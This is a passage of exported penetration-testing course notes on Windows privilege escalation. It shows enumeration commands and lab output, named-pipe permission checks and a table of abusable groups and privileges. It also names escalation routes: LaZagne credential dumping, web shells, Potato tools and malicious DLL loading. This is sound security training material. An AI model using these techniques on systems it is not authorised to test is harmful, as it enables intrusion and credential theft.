AM\nWINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\\Administrator 4/13/2021 12:00:00 AM\n```\n\n#### Installed Programs\n\nWMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Is `FileZilla`/`Putty`/etc installed? Run `LaZagne` to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> wmic product get name\n\nName\nMicrosoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127\nJava 8 Update 231 (64-bit)\nMicrosoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127\nVMware Tools\nMicrosoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127\nMicrosoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127\nJava Auto Updater\n\n<SNIP>\n```\n\nWe can, of course, do this with PowerShell as well using the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet.\n\nInitial Enumeration\n\n```powershell-session\nPS C:\\htb> Get-WmiObject -Class Win32_Product |  select Name, Version\n\nName                                                                    Version\n----                                                                    -------\nSQL Server 2016 Database Engine Shared                                  13.2.5026.0\nMicrosoft OLE DB Driver for SQL Server                                  18.3.0.0\nMicrosoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219\nMicrosoft Help Viewer 2.3                                               2.3.28107\nMicrosoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219\nMicrosoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005\nMicrosoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005\nMicrosoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914\nMicrosoft ODBC Driver 13 for SQL Server                                 13.2.5026.0\nSQL Server 2016 Database Engine Shared                                  13.2.5026.0\nSQL Server 2016 Database Engine Services                                13.2.5026.0\nSQL Server Management Studio for Reporting Services                     15.0.18369.0\nMicrosoft SQL Server 2008 Setup Support Files                           10.3.5500.0\nSSMS Post Install Tasks                                                 15.0.18369.0\nMicrosoft VSS Writer for SQL Server 2016                                13.2.5026.0\nJava 8 Update 231 (64-bit)                                              8.0.2310.11\nBrowser for SQL Server 2016                                             13.2.5026.0\nIntegration Services                                                    15.0.2000.130\n\n<SNIP>\n\n```\n\n#### Display Running Processes\n\nThe [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the local host (when logged on to the host) that we can exploit to escalate privileges.\n\n#### Netstat\n\nInitial Enumeration\n\n```cmd-session\nPS C:\\htb> netstat -ano\n\nActive Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968\n<...SNIP...>\n```\n\n---\n\n## User & Group Information\n\nUsers are often the weakest link in an organization, especially when systems are configured and patched well. It is essential to gain an understanding of the users and groups on the system, members of specific groups that can provide us with admin level access, the privileges our current user has, password policy information, and any logged on users that we may be able to target. We may find the system to be well patched, but a member of the local administrators group's user directory is browsable and contains a password file such as `logins.xlsx`, resulting in a very easy win.\n\n#### Logged-In Users\n\nIt is always important to determine what users are logged into a system. Are they idle or active? Can we determine what they are working on? While more challenging to pull off, we can sometimes attack users directly to escalate privileges or gain further access. During an evasive engagement, we would need to tread lightly on a host with other user(s) actively working on it to avoid detection.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> query user\n\n USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n>administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM\n```\n\n#### Current User\n\nWhen we gain access to a host, we should always check what user context our account is running under first. Sometimes, we are already SYSTEM or equivalent! Suppose we gain access as a service account. In that case, we may have privileges such as `SeImpersonatePrivilege`, which can often be easily abused to escalate privileges using a tool such as [Juicy Potato](https://github.com/ohpe/juicy-potato).\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> echo %USERNAME%\n\nhtb-student \n```\n\n#### Current User Privileges\n\nAs mentioned prior, knowing what privileges our user has can greatly help in escalating privileges. We will look at individual user privileges and escalation paths later in this module.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\n#### Current User Group Information\n\nHas our user inherited any rights through their group membership? Are they privileged in the Active Directory domain environment, which could be leveraged to gain access to more systems?\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID          Attributes\n====================================== ================ ============ ==================================================\nEveryone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nLOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level Label            S-1-16-8192\n```\n\n#### Get All Users\n\nKnowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth checking for credential re-use. Can we access the user profile directory for any important users? We may find valuable files such as scripts with passwords or SSH keys in a user's Desktop, Documents, or Downloads folder.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> net user\n\nUser accounts for \\\\WINLPE-SRV01\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest\nhelpdesk                 htb-student              jordan\nsarah                    secsvc\nThe command completed successfully.\n```\n\n#### Get All Groups\n\nKnowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> net localgroup\n\nAliases for \\\\WINLPE-SRV01\n\n-------------------------------------------------------------------------------\n*Access Control Assistance Operators\n*Administrators\n*Backup Operators\n*Certificate Service DCOM Access\n*Cryptographic Operators\n*Distributed COM Users\n*Event Log Readers\n*Guests\n*Hyper-V Administrators\n*IIS_IUSRS\n*Network Configuration Operators\n*Performance Log Users\n*Performance Monitor Users\n*Power Users\n*Print Operators\n*RDS Endpoint Servers\n*RDS Management Servers\n*RDS Remote Access Servers\n*Remote Desktop Users\n*Remote Management Users\n*Replicator\n*Storage Replica Administrators\n*System Managed Accounts Group\n*Users\nThe command completed successfully.\n```\n\n#### Details About a Group\n\nIt is worth checking out the details for any non-standard groups. Though unlikely, we may find a password or other interesting information stored in the group's description. During our enumeration, we may discover credentials of another non-admin user who is a member of a local group that can be leveraged to escalate privileges.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> net localgroup administrators\n\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nhelpdesk\nsarah\nsecsvc\nThe command completed successfully. \n```\n\n#### Get Password Policy & Other Account Information\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> net accounts\n\nForce user logoff how long after time expires?:       Never\nMinimum password age (days):                          0\nMaximum password age (days):                          42\nMinimum password length:                              0\nLength of password history maintained:                None\nLockout threshold:                                    Never\nLockout duration (minutes):                           30\nLockout observation window (minutes):                 30\nComputer role:                                        SERVER\nThe command completed successfully.\n```\n\n---\n\n## Moving On\n\nAs stated before, this is not an exhaustive list of enumeration commands. The tools we discussed in the previous section will greatly assist in speeding up the enumeration process and making sure it is comprehensive with no stone left unturned. Many cheat sheets are available to help us, such as [this one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md). Study the tools and their output and start making your own command cheat sheet, so it is readily available in case you encounter an environment that requires mostly or all manual enumeration.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/06-Communication with Processes",
    "path": "02_CPTS/17-Windows Privilege Escalation/06-Communication with Processes.md",
    "title": "06 Communication With Processes",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Communication with Processes --- One of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator, it may l...",
    "category": "02_CPTS",
    "content": "# Communication with Processes\n\n---\n\nOne of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator, it may lead to additional privileges. The most common example is discovering a web server like IIS or XAMPP running on the box, placing an `aspx/php` shell on the box, and gaining a shell as the user running the web server. Generally, this is not an administrator but will often have the `SeImpersonate` token, allowing for `Rogue/Juicy/Lonely Potato` to provide SYSTEM permissions.\n\n---\n\n## Access Tokens\n\nIn Windows, [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) are used to describe the security context (security attributes or rules) of a process or thread. The token includes information about the user account's identity and privileges related to a specific process or thread. When a user authenticates to a system, their password is verified against a security database, and if properly authenticated, they will be assigned an access token. Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level.\n\n---\n\n## Enumerating Network Services\n\nThe most common way people interact with processes is through a network socket (DNS, HTTP, SMB, etc.). The [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the localhost (when logged on to the host) that we can exploit to escalate privileges.\n\n#### Display Active Network Connections\n\nCommunication with Processes\n\n```cmd-session\nC:\\htb> netstat -ano\n\nActive Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936\n  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044\n  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       996\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1260\n  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2008\n  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600\n  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1888\n  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       616\n  TCP    10.129.43.8:139        0.0.0.0:0              LISTENING       4\n  TCP    10.129.43.8:3389       10.10.14.3:63191       ESTABLISHED     936\n  TCP    10.129.43.8:49671      40.67.251.132:443      ESTABLISHED     1260\n  TCP    10.129.43.8:49773      52.37.190.150:443      ESTABLISHED     2608\n  TCP    10.129.43.8:51580      40.67.251.132:443      ESTABLISHED     3808\n  TCP    10.129.43.8:54267      40.67.254.36:443       ESTABLISHED     3808\n  TCP    10.129.43.8:54268      40.67.254.36:443       ESTABLISHED     1260\n  TCP    10.129.43.8:54269      64.233.184.189:443     ESTABLISHED     2608\n  TCP    10.129.43.8:54273      216.58.210.195:443     ESTABLISHED     2608\n  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812\n\n<SNIP>\n\n  TCP    192.168.20.56:139      0.0.0.0:0              LISTENING       4\n  TCP    [::]:21                [::]:0                 LISTENING       3812\n  TCP    [::]:80                [::]:0                 LISTENING       4\n  TCP    [::]:135               [::]:0                 LISTENING       836\n  TCP    [::]:445               [::]:0                 LISTENING       4\n  TCP    [::]:3389              [::]:0                 LISTENING       936\n  TCP    [::]:5985              [::]:0                 LISTENING       4\n  TCP    [::]:8080              [::]:0                 LISTENING       5044\n  TCP    [::]:47001             [::]:0                 LISTENING       4\n  TCP    [::]:49664             [::]:0                 LISTENING       528\n  TCP    [::]:49665             [::]:0                 LISTENING       996\n  TCP    [::]:49666             [::]:0                 LISTENING       1260\n  TCP    [::]:49668             [::]:0                 LISTENING       2008\n  TCP    [::]:49669             [::]:0                 LISTENING       600\n  TCP    [::]:49670             [::]:0                 LISTENING       1888\n  TCP    [::]:49674             [::]:0                 LISTENING       616\n  TCP    [::1]:14147            [::]:0                 LISTENING       3812\n  UDP    0.0.0.0:123            *:*                                    1104\n  UDP    0.0.0.0:500            *:*                                    1260\n  UDP    0.0.0.0:3389           *:*                                    936\n\n<SNIP>\n```\n\nThe main thing to look for with Active Network Connections are entries listening on loopback addresses (`127.0.0.1` and `::1`) that are not listening on the IP Address (`10.129.43.8`) or broadcast (`0.0.0.0`, `::/0`). The reason for this is network sockets on localhost are often insecure due to the thought that \"they aren't accessible to the network.\" The one that sticks out immediately will be port `14147`, which is used for FileZilla's administrative interface. By connecting to this port, it may be possible to extract FTP passwords in addition to creating an FTP Share at c:\\ as the FileZilla Server user (potentially Administrator).\n\n#### More Examples\n\nOne of the best examples of this type of privilege escalation is the `Splunk Universal Forwarder`, installed on endpoints to send logs into Splunk. The default configuration of Splunk did not have any authentication on the software and allowed anyone to deploy applications, which could lead to code execution. Again, the default configuration of Splunk was to run it as SYSTEM$ and not a low privilege user. For more information, check out [Splunk Universal Forwarder Hijacking](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) and [SplunkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/).\n\nAnother overlooked but common local privilege escalation vector is the `Erlang Port` (25672). Erlang is a programming language designed around distributed computing and will have a network port that allows other Erlang nodes to join the cluster. The secret to join this cluster is called a cookie. Many applications that utilize Erlang will either use a weak cookie (RabbitMQ uses `rabbit` by default) or place the cookie in a configuration file that is not well protected. Some example Erlang applications are SolarWinds, RabbitMQ, and CouchDB. For more information check out the [Erlang-arce blogpost from Mubix](https://malicious.link/post/2018/erlang-arce/)\n\n---\n\n## Named Pipes\n\nThe other way processes communicate with each other is through Named Pipes. Pipes are essentially files stored in memory that get cleared out after being read. Cobalt Strike uses Named Pipes for every command (excluding [BOF](https://www.cobaltstrike.com/help-beacon-object-files)). Essentially the workflow looks like this:\n\n1. Beacon starts a named pipe of \\.\\pipe\\msagent_12\n2. Beacon starts a new process and injects command into that process directing output to \\.\\pipe\\msagent_12\n3. Server displays what was written into \\.\\pipe\\msagent_12\n\nCobalt Strike did this because if the command being ran got flagged by antivirus or crashed, it would not affect the beacon (process running the command). Often, Cobalt Strike users will change their named pipes to masquerade as another program. One of the most common examples is mojo instead of msagent. One of my favorite findings was finding a named pipe start with mojo, but the computer itself did not have Chrome installed. Thankfully, this turned out to be the company's internal red team. It speaks volumes when an external consultant finds the red team, but the internal blue team did not.\n\n#### More on Named Pipes\n\nPipes are used for communication between two applications or processes using shared memory. There are two types of pipes, [named pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) and anonymous pipes. An example of a named pipe is `\\\\.\\PipeName\\\\ExampleNamedPipeServer`. Windows systems use a client-server implementation for pipe communication. In this type of implementation, the process that creates a named pipe is the server, and the process communicating with the named pipe is the client. Named pipes can communicate using `half-duplex`, or a one-way channel with the client only being able to write data to the server, or `duplex`, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe. Every active connection to a named pipe server results in the creation of a new named pipe. These all share the same pipe name but communicate using a different data buffer.\n\nWe can use the tool [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) from the Sysinternals Suite to enumerate instances of named pipes.\n\n#### Listing Named Pipes with Pipelist\n\nCommunication with Processes\n\n```cmd-session\nC:\\htb> pipelist.exe /accepteula\n\nPipeList v1.02 - Lists open named pipes\nCopyright (C) 2005-2016 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nPipe Name                                    Instances       Max Instances\n---------                                    ---------       -------------\nInitShutdown                                      3               -1\nlsass                                             4               -1\nntsvcs                                            3               -1\nscerpc                                            3               -1\nWinsock2\\CatalogChangeListener-340-0              1                1\nWinsock2\\CatalogChangeListener-414-0              1                1\nepmapper                                          3               -1\nWinsock2\\CatalogChangeListener-3ec-0              1                1\nWinsock2\\CatalogChangeListener-44c-0              1                1\nLSM_API_service                                   3               -1\natsvc                                             3               -1\nWinsock2\\CatalogChangeListener-5e0-0              1                1\neventlog                                          3               -1\nWinsock2\\CatalogChangeListener-6a8-0              1                1\nspoolss                                           3               -1\nWinsock2\\CatalogChangeListener-ec0-0              1                1\nwkssvc                                            4               -1\ntrkwks                                            3               -1\nvmware-usbarbpipe                                 5               -1\nsrvsvc                                            4               -1\nROUTER                                            3               -1\nvmware-authdpipe                                  1                1\n\n<SNIP>\n```\n\nAdditionally, we can use PowerShell to list named pipes using `gci` (`Get-ChildItem`).\n\n#### Listing Named Pipes with PowerShell\n\nCommunication with Processes\n\n```powershell-session\nPS C:\\htb>  gci \\\\.\\pipe\\\n\n\n    Directory: \\\\.\\pipe\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n------       12/31/1600   4:00 PM              3 InitShutdown\n------       12/31/1600   4:00 PM              4 lsass\n------       12/31/1600   4:00 PM              3 ntsvcs\n------       12/31/1600   4:00 PM              3 scerpc\n\n\n    Directory: \\\\.\\pipe\\Winsock2\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n------       12/31/1600   4:00 PM              1 Winsock2\\CatalogChangeListener-34c-0\n\n\n    Directory: \\\\.\\pipe\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n------       12/31/1600   4:00 PM              3 epmapper\n\n<SNIP>\n\n```\n\nAfter obtaining a listing of named pipes, we can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL), which shows us who has the permissions to modify, write, read, or execute a resource. Let's take a look at the `LSASS` process. We can also review the DACLs of all named pipes using the command `.\\accesschk.exe /accepteula \\pipe\\`.\n\n#### Reviewing LSASS Named Pipe Permissions\n\nCommunication with Processes\n\n```cmd-session\nC:\\htb> accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v\n\nAccesschk v6.12 - Reports effective permissions for securable objects\nCopyright (C) 2006-2017 Mark Russinovich\nSysinternals - www.sysinternals.com\n\n\\\\.\\Pipe\\lsass\n  Untrusted Mandatory Level [No-Write-Up]\n  RW Everyone\n        FILE_READ_ATTRIBUTES\n        FILE_READ_DATA\n        FILE_READ_EA\n        FILE_WRITE_ATTRIBUTES\n        FILE_WRITE_DATA\n        FILE_WRITE_EA\n        SYNCHRONIZE\n        READ_CONTROL\n  RW NT AUTHORITY\\ANONYMOUS LOGON\n        FILE_READ_ATTRIBUTES\n        FILE_READ_DATA\n        FILE_READ_EA\n        FILE_WRITE_ATTRIBUTES\n        FILE_WRITE_DATA\n        FILE_WRITE_EA\n        SYNCHRONIZE\n        READ_CONTROL\n  RW APPLICATION PACKAGE AUTHORITY\\Your Windows credentials\n        FILE_READ_ATTRIBUTES\n        FILE_READ_DATA\n        FILE_READ_EA\n        FILE_WRITE_ATTRIBUTES\n        FILE_WRITE_DATA\n        FILE_WRITE_EA\n        SYNCHRONIZE\n        READ_CONTROL\n  RW BUILTIN\\Administrators\n        FILE_ALL_ACCESS\n```\n\nFrom the output above, we can see that only administrators have full access to the LSASS process, as expected.\n\n---\n\n## Named Pipes Attack Example\n\nLet's walk through an example of taking advantage of an exposed named pipe to escalate privileges. This [WindscribeService Named Pipe Privilege Escalation](https://www.exploit-db.com/exploits/48021) is a great example. Using `accesschk` we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \\pipe\\* -v` and notice that the `WindscribeService` named pipe allows `READ` and `WRITE` access to the `Everyone` group, meaning all authenticated users.\n\n#### Checking WindscribeService Named Pipe Permissions\n\nConfirming with `accesschk` we see that the Everyone group does indeed have `FILE_ALL_ACCESS` (All possible access rights) over the pipe.\n\nCommunication with Processes\n\n```cmd-session\nC:\\htb> accesschk.exe -accepteula -w \\pipe\\WindscribeService -v\n\nAccesschk v6.13 - Reports effective permissions for securable objects\nCopyright ⌐ 2006-2020 Mark Russinovich\nSysinternals - www.sysinternals.com\n\n\\\\.\\Pipe\\WindscribeService\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW Everyone\n        FILE_ALL_ACCESS\n```\n\nFrom here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/07-Windows Privileges Overview",
    "path": "02_CPTS/17-Windows Privilege Escalation/07-Windows Privileges Overview.md",
    "title": "07 Windows Privileges Overview",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Windows Privileges Overview --- Privileges in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutt...",
    "category": "02_CPTS",
    "content": "# Windows Privileges Overview\n\n---\n\n[Privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges) in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application, and more. Privileges are different from access rights, which a system uses to grant or deny access to securable objects. User and group privileges are stored in a database and granted via an access token when a user logs on to a system. An account can have local privileges on a specific computer and different privileges on different systems if the account belongs to an Active Directory domain. Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled. Most privileges are disabled by default. Some can be enabled by opening an administrative cmd.exe or PowerShell console, while others can be enabled manually.\n\nThe goal of an assessment is often to gain administrative access to a system or multiple systems. Suppose we can log in to a system as a user with a specific set of privileges. In that case, we may be able to leverage this built-in functionality to escalate privileges directly or use the target account's assigned privileges to further our access in pursuit of our ultimate goal.\n\n---\n\n## Windows Authorization Process\n\nSecurity principals are anything that can be authenticated by the Windows operating system, including user and computer accounts, processes that run in the security context or another user/computer account, or the security groups that these accounts belong to. Security principals are the primary way of controlling access to resources on Windows hosts. Every single security principal is identified by a unique [Security Identifier (SID)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows). When a security principal is created, it is assigned a SID which remains assigned to that principal for its lifetime.\n\nThe below diagram walks through the Windows authorization and access control process at a high level, showing, for example, the process started when a user attempts to access a securable object such as a folder on a file share. During this process, the user's access token (including their user SID, SIDs for any groups they are members of, privilege list, and other access information) is compared against [Access Control Entries (ACEs)](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries) within the object's [security descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors) (which contains security information about a securable object such as access rights (discussed below) granted to users or groups). Once this comparison is complete, a decision is made to either grant or deny access. This entire process happens almost instantaneously whenever a user tries to access a resource on a Windows host. As part of our enumeration and privilege escalation activities, we attempt to use and abuse access rights and leverage or insert ourselves into this authorization process to further our access towards our goal.\n\n![Diagram showing access control process. Subject (user) with access token including User SID, Group SIDs, Privileges, and Extra Access Information. Object (folder) with security descriptor including Object Owner SID, Group SID, SACL, and DACL with ACEs. System performs access check, examines ACEs until a match is found, and makes access decision.](https://academy.hackthebox.com/storage/modules/67/auth_process.png)\n\n[Image source](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-principals)\n\n---\n\n## Rights and Privileges in Windows\n\nWindows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment. Ultimately, these may be used to gain Domain Admin, local administrator, or SYSTEM privileges on a Windows workstation, server, or Domain Controller (DC). Some of these groups are listed below.\n\n|**Group**|**Description**|\n|---|---|\n|Default Administrators|Domain Admins and Enterprise Admins are \"super\" groups.|\n|Server Operators|Members can modify services, access SMB shares, and backup files.|\n|Backup Operators|Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|\n|Print Operators|Members can log on to DCs locally and \"trick\" Windows into loading a malicious driver.|\n|Hyper-V Administrators|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|\n|Account Operators|Members can modify non-protected accounts and groups in the domain.|\n|Remote Desktop Users|Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol.|\n|Remote Management Users|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|\n|Group Policy Creator Owners|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|\n|Schema Admins|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|\n|DNS Admins|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/).|\n\n---\n\n## User Rights Assignment\n\nDepending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. This Microsoft article on [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment) provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. Below are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.\n\n|Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)|Setting Name|Standard Assignment|Description|\n|---|---|---|---|\n|SeNetworkLogonRight|[Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)|Administrators, Authenticated Users|Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.|\n|SeRemoteInteractiveLogonRight|[Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)|Administrators, Remote Desktop Users|This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.|\n|SeBackupPrivilege|[Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)|Administrators|This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.|\n|SeSecurityPrivilege|[Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)|Administrators|This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.|\n|SeTakeOwnershipPrivilege|[Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)|Administrators|This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.|\n|SeDebugPrivilege|[Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)|Administrators|This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.|\n|SeImpersonatePrivilege|[Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)|Administrators, Local Service, Network Service, Service|This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.|\n|SeLoadDriverPrivilege|[Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)|Administrators|This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.|\n|SeRestorePrivilege|[Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)|Administrators|This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.|\n\nFurther information can be found [here](https://4sysops.com/archives/user-rights-assignment-in-windows-server-2016/).\n\nTyping the command `whoami /priv` will give you a listing of all user rights assigned to your current user. Some rights are only available to administrative users and can only be listed/leveraged when running an elevated cmd or PowerShell session. These concepts of elevated rights and [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) are security features introduced 